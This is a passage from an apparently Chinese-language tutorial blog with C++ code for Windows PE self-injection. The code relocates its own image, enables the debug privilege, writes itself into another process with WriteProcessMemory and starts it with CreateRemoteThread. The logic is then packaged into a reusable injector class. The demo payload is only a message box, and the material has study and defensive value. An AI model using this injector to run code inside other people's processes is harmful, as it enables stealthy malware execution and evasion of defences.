class="number">1</span>\].VirtualAddress);</div><div class="line">	<span class="keyword">for</span> (; pImportDescriptor-&gt;OriginalFirstThunk != <span class="number">0</span>; pImportDescriptor++)<span class="comment">//遍历导入表</span></div><div class="line">	&#123;</div><div class="line">		HMODULE hDll = LoadLibraryA((LPCSTR)(lpInjectBase + pImportDescriptor-&gt;Name));</div><div class="line">		<span class="comment">//上面能直接引用LoadLibrary是由于本地和远程进程中该函数地址都是相同的</span></div><div class="line">		<span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</div><div class="line">			<span class="keyword">return</span> FALSE;</div><div class="line">		PIMAGE\_THUNK\_DATA Origin = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;OriginalFirstThunk);</div><div class="line">		PIMAGE\_THUNK\_DATA First = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;FirstThunk);</div><div class="line">		LPCSTR Name = <span class="literal">NULL</span>;</div><div class="line">		PIMAGE\_IMPORT\_BY\_NAME Import\_name = <span class="literal">NULL</span>;</div><div class="line">		<span class="keyword">for</span> (; Origin-&gt;u1.Ordinal != <span class="number">0</span>; Origin++, First++)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">if</span> (Origin-&gt;u1.Ordinal &amp; IMAGE\_ORDINAL\_FLAG)</div><div class="line">				Name = (LPCSTR)IMAGE_ORDINAL(Origin-&gt;u1.Ordinal);</div><div class="line">			<span class="keyword">else</span></div><div class="line">			&#123;</div><div class="line">				Import\_name = (PIMAGE\_IMPORT\_BY\_NAME)(lpInjectBase + (DWORD)(Origin-&gt;u1.AddressOfData));</div><div class="line">				Name = (LPCSTR)Import_name-&gt;Name;</div><div class="line">			&#125;</div><div class="line">			First-&gt;u1.Function = (DWORD )GetProcAddress(hDll, Name);</div><div class="line">			<span class="comment">//上面能直接引用GetProcAddress是由于本地和远程进程中该函数地址都是相同的</span></div><div class="line">			<span class="keyword">if</span> (First-&gt;u1.Function == <span class="literal">NULL</span>)</div><div class="line">				<span class="keyword">return</span> FALSE;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//远程要执行的代码，在这里只演示MessageBox</span></div><div class="line"><span class="function">DWORD <span class="title">RemoteThread_Main</span><span class="params">(HINSTANCE hInstance)</span> </span></div><div class="line">&#123;</div><div class="line">	::MessageBox(<span class="number">0</span>, \_T(<span class="string">"远程线程插入成功！"</span>), \_T(<span class="string">"远程线程"</span>), <span class="number">0</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//CreateRemoteThread的线程运行入口</span></div><div class="line"><span class="function">DWORD <span class="title">ThreadEntry</span><span class="params">(LPBYTE  lpImageBase)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (LoadAPI(lpImageBase))<span class="comment">//先完成API函数的导入工作</span></div><div class="line">		RemoteThread\_Main((HINSTANCE)lpImageBase);  <span class="comment">//执行函数RemoteThread\_Main中的代码</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//注入</span></div><div class="line"><span class="function">BOOL <span class="title">Inject</span><span class="params">(DWORD dwProcessID)</span></span></div><div class="line">&#123;</div><div class="line">	LPBYTE lpNewMoudle = <span class="literal">NULL</span>;</div><div class="line">	HANDLE hRemoteProcess = <span class="literal">NULL</span>;</div><div class="line">	HANDLE hRemoteThread = <span class="literal">NULL</span>;</div><div class="line">	BOOL bRet=TRUE;</div><div class="line"></div><div class="line">	__try</div><div class="line">	&#123;</div><div class="line">		<span class="comment">//获取自身句柄</span></div><div class="line">		LPBYTE lpMoudle = <span class="literal">NULL</span>;</div><div class="line">		lpMoudle = (LPBYTE)GetModuleHandle(<span class="literal">NULL</span>);</div><div class="line">		<span class="keyword">if</span> (lpMoudle == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"GetModuleHandle failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//获取NT_HEADER</span></div><div class="line">		PIMAGE\_NT\_HEADERS pNtHeader = <span class="literal">NULL</span>;</div><div class="line">		pNtHeader = (PIMAGE\_NT\_HEADERS)(lpMoudle + ((PIMAGE\_DOS\_HEADER)lpMoudle)-&gt;e_lfanew);</div><div class="line"></div><div class="line">		<span class="comment">//得到自身映像大小</span></div><div class="line">		DWORD dwImageSize;</div><div class="line">		dwImageSize = pNtHeader-&gt;OptionalHeader.SizeOfImage;</div><div class="line"></div><div class="line">		<span class="comment">//在当前空间申请空间存放自身代码</span></div><div class="line">		lpNewMoudle = (LPBYTE)VirtualAlloc(<span class="literal">NULL</span>, dwImageSize, MEM\_COMMIT | MEM\_RESERVE,</div><div class="line">			PAGE\_EXECUTE\_READWRITE);</div><div class="line">		<span class="keyword">if</span> (lpNewMoudle == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"VirtualAlloc failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//拷贝自身到buffer</span></div><div class="line">		PIMAGE\_NT\_HEADERS pNewNtHeader = <span class="literal">NULL</span>;</div><div class="line">		memcpy_s(lpNewMoudle, dwImageSize, lpMoudle, dwImageSize);</div><div class="line"></div><div class="line">		<span class="comment">//获取Buffer中NtHeader</span></div><div class="line">		pNewNtHeader = (PIMAGE\_NT\_HEADERS)(lpNewMoudle + ((PIMAGE\_DOS\_HEADER)lpMoudle)-&gt;e_lfanew);</div><div class="line"></div><div class="line">		<span class="comment">//获取远程进程ID</span></div><div class="line">		dwProcessID = <span class="number">1516</span>;</div><div class="line"></div><div class="line">		<span class="comment">//打开远程进程</span></div><div class="line">		hRemoteProcess = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, dwProcessID);</div><div class="line">		<span class="keyword">if</span> (hRemoteProcess == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"OpenProcess failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//在远程进程申请空间</span></div><div class="line">		LPBYTE lpInjectPoint;</div><div class="line">		lpInjectPoint = (LPBYTE)VirtualAllocEx(hRemoteProcess, <span class="number">0</span>, dwImageSize, MEM\_COMMIT, PAGE\_EXECUTE_READWRITE);</div><div class="line">		<span class="keyword">if</span> (lpInjectPoint == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"VirtualAllocEx failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//重定位NewMoudle代码</span></div><div class="line">		RelocCode(lpNewMoudle, lpInjectPoint);</div><div class="line"></div><div class="line">		<span class="comment">//得到ThreadEntry在远程进程中的地址</span></div><div class="line">		LPTHREAD\_START\_ROUTINE lpRemoteEntryPoint;</div><div class="line">		LPBYTE lpParam;</div><div class="line">		lpRemoteEntryPoint = (LPTHREAD\_START\_ROUTINE)(lpInjectPoint + (DWORD)&amp;ThreadEntry - lpMoudle);</div><div class="line"></div><div class="line">		<span class="comment">//将插入点地址作为参数传递给线程函数</span></div><div class="line">		lpParam = lpInjectPoint; </div><div class="line"></div><div class="line">		<span class="comment">//将重定位好的代码通过WriteProcessMemory写入远程进程的内存空间中</span></div><div class="line">		<span class="keyword">if</span> (!WriteProcessMemory(hRemoteProcess, lpInjectPoint, lpNewMoudle, dwImageSize, <span class="literal">NULL</span>))</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"WriteProcessMemory failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//通过CreateRemoteThread启动刚写入的代码，参数为Param</span></div><div class="line">		hRemoteThread = CreateRemoteThread(hRemoteProcess, <span class="literal">NULL</span>, <span class="number">0</span>, lpRemoteEntryPoint, lpParam, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">		<span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"CreateRemoteThread failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line"><span class="comment">// 		//等待线程执行完成</span></div><div class="line"><span class="comment">// 		WaitForSingleObject(hRemoteThread, INFINITE);</span></div><div class="line"><span class="comment">// </span></div><div class="line"><span class="comment">// 		//获取完成返回值</span></div><div class="line"><span class="comment">// 		DWORD dwExitCode;</span></div><div class="line"><span class="comment">// 		if (!GetExitCodeThread(hRemoteThread, &amp;dwExitCode))</span></div><div class="line"><span class="comment">// 		&#123;</span></div><div class="line"><span class="comment">// 			OutputDebugString(_T("GetExitCodeThread failedn"));</span></div><div class="line"><span class="comment">// 			bRet = FALSE;</span></div><div class="line"><span class="comment">// 			__leave;</span></div><div class="line"><span class="comment">//		&#125;</span></div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	__finally</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span> (lpNewMoudle != <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			VirtualFree(lpNewMoudle, <span class="number">0</span>, MEM_RELEASE);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> (hRemoteProcess != <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			CloseHandle(hRemoteProcess);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> bRet;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h1 id="0x04-封装成类"><a href="#0x04-封装成类" class="headerlink" title="0x04 封装成类"></a>0x04 封装成类</h1><p>把整个实现封装成了一个类，方便调用</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div></pre></td><td class="code"><pre><div class="line">#pragma once</div><div class="line">class CInjectCode</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	CInjectCode(DWORD (*fn)(HINSTANCE));</div><div class="line">	~CInjectCode();</div><div class="line"></div><div class="line">	void SetRemoteThread_Main(DWORD(*fn)(HINSTANCE));</div><div class="line">	//注入</div><div class="line">	BOOL Inject(DWORD dwProcessID);</div><div class="line">	BOOL Inject(const wchar_t* wszProcessName);</div><div class="line"></div><div class="line">private:</div><div class="line">	//完成重定位</div><div class="line">	void RelocCode(LPBYTE lpImage, LPBYTE lpInjectBase);</div><div class="line">	//用于完成API函数的导入，参数为要插入代码处地址</div><div class="line">	BOOL LoadAPI(LPBYTE lpInjectBase);</div><div class="line">	//CreateRemoteThread的线程运行入口</div><div class="line">	DWORD ThreadEntry(LPBYTE  lpImageBase);</div><div class="line">	//通过进程名获取进程ID</div><div class="line">	BOOL GetProcessIDByName(const wchar_t* wszProcessName, DWORD&amp; dwProcID);</div><div class="line">	//提升se_debug权限</div><div class="line">	BOOL AdjustProcessTokenPrivilege();</div><div class="line">private:</div><div class="line">	//远程执行的函数指针</div><div class="line">	DWORD(*fnRemoteThread_Main)(HINSTANCE);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"> </div><div class="line"></div><div class="line">#include "stdafx.h"</div><div class="line">#include "InjectCode.h"</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;tchar.h&gt;</div><div class="line">#include &lt;windows.h&gt;</div><div class="line">#include &lt;memory.h&gt;</div><div class="line">#include &lt;TlHelp32.h&gt;</div><div class="line"></div><div class="line">CInjectCode::CInjectCode(DWORD(*fn)(HINSTANCE))</div><div class="line">&#123;</div><div class="line">	SetRemoteThread_Main(fn);</div><div class="line">&#125;</div><div class="line"></div><div class="line">CInjectCode::~CInjectCode()</div><div class="line">&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void CInjectCode::SetRemoteThread_Main(DWORD(*fn)(HINSTANCE))</div><div class="line">&#123;</div><div class="line">	fnRemoteThread_Main = fn;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//提升se_debug权限</div><div class="line">BOOL CInjectCode::AdjustProcessTokenPrivilege()</div><div class="line">&#123;</div><div class="line">	LUID luidTmp;</div><div class="line">	HANDLE hToken;</div><div class="line">	TOKEN_PRIVILEGES tkp;</div><div class="line"></div><div class="line">	if (!OpenProcessToken(GetCurrentProcess(), TOKEN\_ADJUST\_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</div><div class="line">	&#123;</div><div class="line">		OutputDebugString(_T("AdjustProcessTokenPrivilege OpenProcessToken Failed ! n"));</div><div class="line"></div><div class="line">		return FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (!LookupPrivilegeValue(NULL, SE\_DEBUG\_NAME, &amp;luidTmp))</div><div class="line">	&#123;</div><div class="line">		OutputDebugString(_T("AdjustProcessTokenPrivilege LookupPrivilegeValue Failed ! n"));</div><div class="line"></div><div class="line">		CloseHandle(hToken);</div><div class="line"></div><div class="line">		return FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	tkp.PrivilegeCount = 1;</div><div class="line">	tkp.Privileges\[0\].Luid = luidTmp;</div><div class="line">	tkp.Privileges\[0\].Attributes = SE\_PRIVILEGE\_ENABLED;</div><div class="line"></div><div class="line">	if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL))</div><div class="line">	&#123;</div><div class="line">		OutputDebugString(_T("AdjustProcessTokenPrivilege AdjustTokenPrivileges Failed ! n"));</div><div class="line"></div><div class="line">		CloseHandle(hToken);</div><div class="line"></div><div class="line">		return FALSE;</div><div class="line">	&#125;</div><div class="line">	return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//完成重定位</div><div class="line">void CInjectCode::RelocCode(LPBYTE lpImage, LPBYTE lpInjectBase)</div><div class="line">&#123;</div><div class="line">	DWORD  dwRva = 0, dwRvaCount = 0, dwRelocOffset = 0;</div><div class="line">	LPWORD  lpwOffset = NULL;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = NULL;</div><div class="line">	LPBYTE lpRelocTable;</div><div class="line">	PIMAGE\_BASE\_RELOCATION  pBaseReloc;</div><div class="line"></div><div class="line">	//获取ntheader</div><div class="line">	pNtHeader = (PIMAGE\_NT\_HEADERS)(lpImage + ((PIMAGE\_DOS\_HEADER)lpImage)-&gt;e_lfanew);</div><div class="line">	//获取重定位表位置</div><div class="line">	lpRelocTable = lpImage + pNtHeader-&gt;OptionalHeader.DataDirectory\[5\].VirtualAddress;</div><div class="line">	pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	//获取重定位表偏移</div><div class="line">	dwRelocOffset = (DWORD)lpInjectBase - pNtHeader-&gt;OptionalHeader.ImageBase;</div><div class="line"></div><div class="line">	//遍历重定位表，修正需要重定位的代码</div><div class="line">	while (pBaseReloc-&gt;VirtualAddress != NULL)</div><div class="line">	&#123;</div><div class="line">		lpwOffset = (WORD*)(lpRelocTable + sizeof(IMAGE\_BASE\_RELOCATION));</div><div class="line">		dwRvaCount = (pBaseReloc-&gt;SizeOfBlock - sizeof(IMAGE\_BASE\_RELOCATION)) / 2;</div><div class="line"></div><div class="line">		//循环修正</div><div class="line">		for (DWORD i = 0; i &lt; dwRvaCount; i++)</div><div class="line">		&#123;</div><div class="line">			//获取要修正的RVA</div><div class="line">			dwRva = (DWORD)lpImage + (pBaseReloc-&gt;VirtualAddress) + (DWORD)(*lpwOffset &amp; 0x0fff);</div><div class="line">			//RVA加上修正量进行修正</div><div class="line">			*(DWORD*)dwRva += dwRelocOffset;</div><div class="line">			lpwOffset++;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//指向下一页重定位信息处</div><div class="line">		lpRelocTable += pBaseReloc-&gt;SizeOfBlock;</div><div class="line">		pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//用于完成API函数的导入，参数为要插入代码处地址</div><div class="line">BOOL CInjectCode::LoadAPI(LPBYTE lpInjectBase)</div><div class="line">&#123;</div><div class="line">	PIMAGE\_DOS\_HEADER pDosHeader = (PIMAGE\_DOS\_HEADER)lpInjectBase;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = (PIMAGE\_NT\_HEADERS)(lpInjectBase + pDosHeader-&gt;e_lfanew);</div><div class="line">	PIMAGE\_IMPORT\_DESCRIPTOR pImportDescriptor = (PIMAGE\_IMPORT\_DESCRIPTOR)</div><div class="line">		(lpInjectBase + pNtHeader-&gt;OptionalHeader.DataDirectory\[1\].VirtualAddress);</div><div class="line">	for (; pImportDescriptor-&gt;OriginalFirstThunk != 0; pImportDescriptor++)//遍历导入表</div><div class="line">	&#123;</div><div class="line">		HMODULE hDll = LoadLibraryA((LPCSTR)(lpInjectBase + pImportDescriptor-&gt;Name));</div><div class="line">		//上面能直接引用LoadLibrary是由于本地和远程进程中该函数地址都是相同的</div><div class="line">		if (hDll == NULL)</div><div class="line">			return FALSE;</div><div class="line">		PIMAGE\_THUNK\_DATA Origin = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;OriginalFirstThunk);</div><div class="line">		PIMAGE\_THUNK\_DATA First = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;FirstThunk);</div><div class="line">		LPCSTR Name = NULL;</div><div class="line">		PIMAGE\_IMPORT\_BY\_NAME Import\_name = NULL;</div><div class="line">		for (; Origin-&gt;u1.Ordinal != 0; Origin++, First++)</div><div class="line">		&#123;</div><div class="line">			if (Origin-&gt;u1.Ordinal &amp; IMAGE\_ORDINAL\_FLAG)</div><div class="line">				Name = (LPCSTR)IMAGE_ORDINAL(Origin-&gt;u1.Ordinal);</div><div class="line">			else</div><div class="line">			&#123;</div><div class="line">				Import\_name = (PIMAGE\_IMPORT\_BY\_NAME)(lpInjectBase + (DWORD)(Origin-&gt;u1.AddressOfData));</div><div class="line">				Name = (LPCSTR)Import_name-&gt;Name;</div><div class="line">			&#125;</div><div class="line">			First-&gt;u1.Function = (DWORD)GetProcAddress(hDll, Name);</div><div class="line">			//上面能直接引用GetProcAddress是由于本地和远程进程中该函数地址都是相同的</div><div class="line">			if (First-&gt;u1.Function == NULL)</div><div class="line">				return FALSE;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//CreateRemoteThread的线程运行入口</div><div class="line">DWORD CInjectCode::ThreadEntry(LPBYTE  lpImageBase)</div><div class="line">&#123;</div><div class="line">	if (LoadAPI(lpImageBase))//先完成API函数的导入工作</div><div class="line">		fnRemoteThread\_Main((HINSTANCE)lpImageBase);  //执行函数RemoteThread\_Main中的代码</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//通过进程名获取进程ID</div><div class="line">BOOL CInjectCode::GetProcessIDByName(const wchar_t* wszProcessName, DWORD&amp; dwProcID)</div><div class="line">&#123;</div><div class="line">	HANDLE hSnapShot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, dwProcID);</div><div class="line">	PROCESSENTRY32 pe = &#123; sizeof(pe) &#125;;</div><div class="line">	BOOL bOk = ::Process32First(hSnapShot, &amp;pe);</div><div class="line">	while (bOk)</div><div class="line">	&#123;</div><div class="line">		if (wcsstr(pe.szExeFile, wszProcessName) != NULL)</div><div class="line">		&#123;</div><div class="line">			dwProcID = pe.th32ProcessID;</div><div class="line">			return TRUE;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		bOk = ::Process32Next(hSnapShot, &amp;pe);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	::CloseHandle(hSnapShot);</div><div class="line"></div><div class="line">	return FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//远程注入</div><div class="line">BOOL CInjectCode::Inject(DWORD dwProcessID)</div><div class="line">&#123;</div><div class="line">	LPBYTE lpNewMoudle = NULL;</div><div class="line">	HANDLE hRemoteProcess = NULL;</div><div class="line">	HANDLE hRemoteThread = NULL;</div><div class="line">	BOOL bRet = TRUE;</div><div class="line"></div><div class="line">	__try</div><div class="line">	&#123;</div><div class="line">		//获取自身句柄</div><div class="line">		LPBYTE lpMoudle = NULL;</div><div class="line">		lpMoudle = (LPBYTE)GetModuleHandle(NULL);</div><div class="line">		if (lpMoudle == NULL)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("GetModuleHandle failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//获取NT_HEADER</div><div class="line">		PIMAGE\_NT\_HEADERS pNtHeader = NULL;</div><div class="line">		pNtHeader = (PIMAGE\_NT\_HEADERS)(lpMoudle + ((PIMAGE\_DOS\_HEADER)lpMoudle)-&gt;e_lfanew);</div><div class="line"></div><div class="line">		//得到自身映像大小</div><div class="line">		DWORD dwImageSize;</div><div class="line">		dwImageSize = pNtHeader-&gt;OptionalHeader.SizeOfImage;</div><div class="line"></div><div class="line">		//在当前空间申请空间存放自身代码</div><div class="line">		lpNewMoudle = (LPBYTE)VirtualAlloc(NULL, dwImageSize, MEM\_COMMIT | MEM\_RESERVE,</div><div class="line">			PAGE\_EXECUTE\_READWRITE);</div><div class="line">		if (lpNewMoudle == NULL)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("VirtualAlloc failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//拷贝自身到buffer</div><div class="line">		PIMAGE\_NT\_HEADERS pNewNtHeader = NULL;</div><div class="line">		memcpy_s(lpNewMoudle, dwImageSize, lpMoudle, dwImageSize);</div><div class="line"></div><div class="line">		//获取Buffer中NtHeader</div><div class="line">		pNewNtHeader = (PIMAGE\_NT\_HEADERS)(lpNewMoudle + ((PIMAGE\_DOS\_HEADER)lpMoudle)-&gt;e_lfanew);	</div><div class="line"></div><div class="line">		//提升权限</div><div class="line">		if (!AdjustProcessTokenPrivilege())</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("OpenProcess failedn"));</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//打开远程进程</div><div class="line">		hRemoteProcess = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, dwProcessID);</div><div class="line">		if (hRemoteProcess == NULL)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("OpenProcess failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//在远程进程申请空间</div><div class="line">		LPBYTE lpInjectPoint;</div><div class="line">		lpInjectPoint = (LPBYTE)VirtualAllocEx(hRemoteProcess, 0, dwImageSize, MEM\_COMMIT, 